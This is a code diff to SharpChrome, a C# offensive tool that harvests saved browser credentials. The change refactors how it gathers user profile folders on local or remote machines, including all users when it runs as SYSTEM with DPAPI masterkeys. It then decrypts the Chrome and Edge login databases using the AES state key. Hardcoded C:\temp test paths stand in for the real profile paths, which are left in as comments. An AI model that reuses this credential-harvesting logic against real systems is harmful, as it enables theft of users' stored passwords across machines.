@@ -15,17 +15,40 @@ namespace SharpChrome
     internal partial class Chrome
     {
         public static void SyncChromiumLogins(Dictionary<string, string> masterKeys, string computerName = "",
-            string userFolder = "",
-            string displayFormat = "table", bool showAll = false, bool unprotect = false, string stateKey = "",
+            string userFolder = "", bool unprotect = false,
             string browser = "chrome", bool quiet = false)
         {
+            var userDirectories = GatherUserProfileDirectories(masterKeys, computerName, userFolder, browser, quiet);
+
+            foreach (string userDirectory in userDirectories) {
+                //var chromeLoginDataPath = $"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
+                var chromeLoginDataPath = $@"C:\temp\chrome\Login Data";
+                //var chromeAesStateKeyPath = $"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
+                var chromeAesStateKeyPath = $@"C:\temp\chrome\Local State";
+
+                //var edgeLoginDataPath = $"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
+                var edgeLoginDataPath = $@"C:\temp\edge\Login Data";
+                //var edgeAesStateKeyPath = $"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
+                var edgeAesStateKeyPath = $@"C:\temp\edge\Local State";
+
+                byte[] chromeAesStateKey = GetStateKey(masterKeys, chromeAesStateKeyPath, unprotect, quiet);
+                byte[] edgeAesStateKey = GetStateKey(masterKeys, edgeAesStateKeyPath, unprotect, quiet);
+
+                var chromeLogins = ParseAndReturnChromeLogins(chromeLoginDataPath, chromeAesStateKey);
+                var edgePasswords = ParseAndReturnChromeLogins(edgeLoginDataPath, edgeAesStateKey);
+            }
+        }
+
+        public static List<string> GatherUserProfileDirectories(Dictionary<string, string> masterKeys, string computerName, string userFolder, 
+            string browser, bool quiet, IProgress<string> progress = null)
+        {
             // triage all Chromium 'Login Data' files we can reach
-            List<string> userDirectories = new List<string>();
+            var userDirectories = new List<string>();
 
             if (!string.IsNullOrEmpty(computerName)) {
                 // if we're triaging a remote computer, check connectivity first
                 if (!SharpDPAPI.Helpers.TestRemote(computerName)) {
-                    return;
+                    return userDirectories;
                 }
 
                 if (!string.IsNullOrEmpty(userFolder)) {
@@ -47,35 +70,34 @@ namespace SharpChrome
                     // if we're SYSTEM
                     if (masterKeys.Count > 0) {
                         if (!quiet) {
-                            Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n",
-                                SharpDPAPI.Helpers.Capitalize(browser));
+                            progress?.Report(
+                                $"\r\n[*] Triaging {SharpDPAPI.Helpers.Capitalize(browser)} Logins for ALL users\r\n");
                         }
 
                         userDirectories = SharpDPAPI.Helpers.GetUserFolders();
                     }
                     else {
-                        if (!quiet) {
-                            Console.WriteLine("\r\n[!] Running as SYSTEM but no masterkeys supplied!");
+                        if (!quiet){
+                            progress?.Report(string.Format("\r\n[!] Running as SYSTEM but no masterkeys supplied!"));
                         }
 
-                        return;
+                        return userDirectories;
                     }
                 }
                 else if (masterKeys.Count == 0) {
                     // if we're elevated but not SYSTEM, and no masterkeys are supplied, assume we're triaging just the current user
                     if (!quiet) {
-                        Console.WriteLine("\r\n[*] Triaging {0} Logins for current user\r\n",
-                            SharpDPAPI.Helpers.Capitalize(browser));
+                        progress?.Report(
+                            $"\r\n[*] Triaging {SharpDPAPI.Helpers.Capitalize(browser)} Logins for current user\r\n");
                     }
 
                     userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                    unprotect = true;
                 }
                 else {
                     // otherwise we're elevated and have masterkeys supplied, so assume we're triaging all users
                     if (!quiet) {
-                        Console.WriteLine("\r\n[*] Triaging {0} Logins for ALL users\r\n",
-                            SharpDPAPI.Helpers.Capitalize(browser));
+                        progress?.Report(
+                            $"\r\n[*] Triaging {SharpDPAPI.Helpers.Capitalize(browser)} Logins for ALL users\r\n");
                     }
 
                     userDirectories = SharpDPAPI.Helpers.GetUserFolders();
@@ -84,31 +106,14 @@ namespace SharpChrome
             else {
                 // not elevated, no user folder specified, so triage current user
                 if (!quiet) {
-                    Console.WriteLine("\r\n[*] Triaging {0} Logins for current user\r\n",
-                        SharpDPAPI.Helpers.Capitalize(browser));
+                    progress?.Report(
+                        $"\r\n[*] Triaging {SharpDPAPI.Helpers.Capitalize(browser)} Logins for current user\r\n");
                 }
 
                 userDirectories.Add(System.Environment.GetEnvironmentVariable("USERPROFILE"));
-                unprotect = true;
             }
 
-            foreach (string userDirectory in userDirectories) {
-                //var chromeLoginDataPath = $"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
-                var chromeLoginDataPath = $@"C:\temp\chrome\Login Data";
-                //var chromeAesStateKeyPath = $"{userDirectory}\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
-                var chromeAesStateKeyPath = $@"C:\temp\chrome\Local State";
-
-                //var edgeLoginDataPath = $"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data";
-                var edgeLoginDataPath = $@"C:\temp\edge\Login Data";
-                //var edgeAesStateKeyPath = $"{userDirectory}\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State";
-                var edgeAesStateKeyPath = $@"C:\temp\edge\Local State";
-
-                byte[] chromeAesStateKey = GetStateKey(masterKeys, chromeAesStateKeyPath, unprotect, quiet);
-                byte[] edgeAesStateKey = GetStateKey(masterKeys, edgeAesStateKeyPath, unprotect, quiet);
-
-                var chromeLogins = ParseAndReturnChromeLogins(chromeLoginDataPath, chromeAesStateKey);
-                var edgePasswords = ParseAndReturnChromeLogins(edgeLoginDataPath, edgeAesStateKey);
-            }
+            return userDirectories;
         }
     }
 
